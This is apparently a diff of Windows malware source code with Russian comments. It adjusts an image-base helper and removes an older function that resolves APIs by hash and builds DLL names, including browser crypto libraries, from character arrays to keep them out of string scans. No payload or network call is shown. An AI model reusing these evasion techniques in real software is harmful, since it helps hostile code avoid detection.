@@ -31,8 +31,8 @@ HMODULE KernelModuleAddr = NULL;
 //  Пример:
 //		DWORD Base = GetImageBase(&MyFunction);
 //--------------------------------------------------
-DWORD WINAPI GetImageBase( LPVOID procAddr )
-{
+LPVOID WINAPI GetImageBase( LPVOID procAddr )
+{  
 	LPBYTE addr = (procAddr) ? (LPBYTE)procAddr : (LPBYTE)&GetImageBase;
 	addr = (LPBYTE)((size_t)addr & 0xFFFFFFFFFFFF0000); // Маска с расчётом на X86 и X64
 	for(;;)
@@ -49,7 +49,7 @@ DWORD WINAPI GetImageBase( LPVOID procAddr )
 		}
 		addr -= 0x1000;
 	}
-	return (DWORD)addr;
+	return addr;
 }
 
 
@@ -426,173 +426,6 @@ LPVOID GetProcAddressEx(PCHAR Dll, DWORD dwModule, DWORD dwProcNameHash )
 
 	return ret;
 }
-
-
-
-
- /*
-
-LPVOID GetProcAddressEx(PCHAR Dll, DWORD dwModule, DWORD dwProcNameHash )
-{
-
-//-----------------------------------------------------------------------------
-
-	// Названия используемых библиотек
-	//char kernel32_dll[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};
-	const static char advapi32_dll[] = {'a','d','v','a','p','i','3','2','.','d','l','l',0};
-	const static char user32_dll[]   = {'u','s','e','r','3','2','.','d','l','l',0};
-	const static char ws2_32_dll[]   = {'w','s','2','_','3','2','.','d','l','l',0};
-	const static char ntdll_dll[]    = {'n','t','d','l','l','.','d','l','l',0};
-	const static char winsta_dll[]   = {'w','i','n','s','t','a','.','d','l','l',0};
-	const static char shell32_dll[]  = {'s','h','e','l','l','3','2','.','d','l','l',0};
-	const static char wininet_dll[]  = {'w','i','n','i','n','e','t','.','d','l','l',0};
-	const static char urlmon_dll[]   = {'u','r','l','m','o','n','.','d','l','l',0};
-	const static char nspr4_dll[]	 = {'n','s','p','r','4','.','d','l','l',0};
-	const static char ssl3_dll[]	 = {'s','s','l','3','.','d','l','l',0};
-	const static char winmm_dll[]	 = {'w','i','n','m','m','.','d','l','l',0};
-	const static char cabinet_dll[]  = {'c','a','b','i','n','e','t','.','d','l','l',0};
-	const static char opera_dll[]	 = {'o','p','e','r','a','.','d','l','l',0};
-	const static char gdi32_dll[]    = {'G', 'd', 'i', '3', '2', '.', 'd', 'l', 'l',  0};
-	const static char gdiPlus_dll[]  = {'g','d','i','p','l','u','s','.','d','l','l', 0};
-	const static char crypt32_dll[]	 = {'c','r','y','p','t','3','2','.','d','l','l',0};
-	const static char Iphlpapi_dll[] = {'I','p','h','l','p','a','p','i','.','d','l','l',0};
-	const static char winspool_drv[] = {'w','i','n','s','p','o','o','l','.','d','r','v',0};
-	
-	const static char odbc32_dll[]    = {'o','d','b','c','3','2','.','d','l','l',0};
-
-	const static char commdlg32_dll[] = {'c','o','m','d','l','g','3','2','.','d','l','l',0};
-	char psapi_dll[]	= {'p','s','a','p','i','.','d','l','l',0};
-	char shlwapi_dll[]	= {'s','h','l','w','a','p','i','.','d','l','l',0};
-	char version_dll[]  = {'v','e','r','s','i','o','n','.','d','l','l',0};
-	char ole32_dll[]    = {'o','l','e','3','2','.','d','l','l',0};
-
-	//-----------------------------------------------------------------------
-	HMODULE Module = NULL;
-
-
-	char *DllName = Dll;
-
-	if (DllName == NULL)
-	{
-		switch ( dwModule ) 
-		{
-			case 1: 
-				Module = GetKernel32();
-				break;
-
-			case 2:
-				DllName = (PCHAR)advapi32_dll;
-				break;
-
-			case 3:
-				DllName = (PCHAR)user32_dll;
-				break;
-
-			case 4:
-				DllName = (PCHAR)ws2_32_dll;
-				break;
-
-			case 5:
-				DllName = (PCHAR)ntdll_dll;
-				break;
-
-			case 6:
-				DllName = (PCHAR)winsta_dll;
-				break;
-
-			case 7:
-				DllName = (PCHAR)shell32_dll;
-				break;
-
-			case 8:
-				DllName = (PCHAR)wininet_dll;
-				break;
-
-			case 9:
-				DllName = (PCHAR)urlmon_dll;
-				break;
-
-			case 10:
-				DllName = (PCHAR)nspr4_dll;
-				break;
-
-			case 11:
-				DllName = (PCHAR)ssl3_dll;
-				break;
-
-			case 12:
-				DllName = (PCHAR)winmm_dll;// для вырубания звука
-				break;
-
-			case 13:
-				DllName = (PCHAR)cabinet_dll;//для архивирования
-				break;
-
-			case 14:
-				DllName = (PCHAR)opera_dll;//для оперы
-				break;
-
-			case DLL_GDI:
-				DllName = (PCHAR)gdi32_dll; break;
-
-			case DLL_GDIPLUS:
-				DllName = (PCHAR)gdiPlus_dll; break;
-
-			case DLL_CRYPT32:
-				DllName = (PCHAR)crypt32_dll; break;
-
-			case DLL_PSAPI:
-				DllName = psapi_dll; break;
-
-			
-			case DLL_SHLWAPI:
-				DllName = shlwapi_dll; break;
-
-
-			case DLL_IPHLPAPI:
-				DllName = (PCHAR)Iphlpapi_dll;break;
-
-			case DLL_WINSPOOL:
-				DllName = (PCHAR)winspool_drv;break;
-			
-			case DLL_COMANDLG32:
-				DllName = (PCHAR)commdlg32_dll;break;
-
-			case DLL_ODBC32:
-				DllName = (PCHAR)odbc32_dll;break;
-			
-			case DLL_VERSION:
-				DllName = version_dll; break;
-			
-			case DLL_OLE32: 
-				DllName = ole32_dll; break;
-
-			default:
-				return 0;
-		}
-	}
-
-	
-	if (Module == NULL && !STR::IsEmpty(DllName))
-	{
-		Module = (HMODULE)pGetModuleHandleA(DllName);
-		if (Module == NULL)
-			Module = (HMODULE)pLoadLibraryA(DllName);
-	}
-
-
-	if (dwProcNameHash == 0)
-		return Module;
-
-	LPVOID ret = GetApiAddr(Module, dwProcNameHash);
-
-	if ( ret == NULL )
-		return (LPVOID)0x00000000;
-
-	return ret;
-}
-
- */
 
 
 
